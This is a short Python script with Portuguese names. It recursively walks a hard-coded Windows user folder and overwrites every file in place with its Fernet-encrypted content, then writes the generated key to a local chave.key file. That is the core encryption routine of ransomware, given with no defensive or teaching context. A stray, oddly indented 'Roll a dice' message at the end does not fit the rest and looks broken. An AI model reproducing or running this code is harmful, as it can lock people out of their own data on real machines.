import os
from cryptography.fernet import Fernet

def encriptar_ficheiro(caminho_ficheiro, chave):
    with open(caminho_ficheiro, "rb") as ficheiro:
        conteúdo = ficheiro.read()
    fernet = Fernet(chave)
    conteúdo_encriptado = fernet.encrypt(conteúdo)  
    with open(caminho_ficheiro, "wb") as ficheiro:
        ficheiro.write(conteúdo_encriptado)

def encriptar_ficheiros_na_pasta(caminho_pasta, chave):
    for raiz, dirs, ficheiros in os.walk(caminho_pasta):
        for ficheiro in ficheiros:
            caminho_ficheiro = os.path.join(raiz, ficheiro)
            encriptar_ficheiro(caminho_ficheiro, chave) 

chave = Fernet.generate_key()

caminho_pasta = r"C:\Users\goncalo.d.cerejeira\informacoes"  

encriptar_ficheiros_na_pasta(caminho_pasta, chave)

with open("chave.key", "wb") as ficheiro_chave:
    ficheiro_chave.write(chave)

    msg = "Roll a dice"
print(msg)

